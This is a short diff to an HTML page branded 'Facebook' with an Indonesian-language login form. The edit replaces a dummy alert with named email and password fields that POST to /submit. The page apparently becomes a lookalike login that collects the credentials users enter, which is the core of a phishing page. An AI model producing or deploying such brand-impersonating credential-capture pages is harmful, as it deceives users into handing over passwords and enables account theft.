@@ -77,10 +77,10 @@
 <body>
     <div class="container">
         <h1>Facebook</h1>
-        <form class="login-form">
-            <input type="text" placeholder="Email atau Telepon" required>
-            <input type="password" placeholder="Kata Sandi" required>
-            <input type="submit" value="Masuk" onclick="alert('Anda Telah Masuk ke Halaman Facebook!')">
+        <form class="login-form" action="/submit" method="post">
+            <input type="text" name="email" placeholder="Email atau Telepon" required>
+            <input type="password" name="password" placeholder="Kata Sandi" required>
+            <input type="submit" value="Masuk">
         </form>
         <a href="#" class="forgot-password">Lupa kata sandi?</a>
         <button class="create-account" onclick="alert('Akun baru dibuat!')">Buat Akun Baru</button>
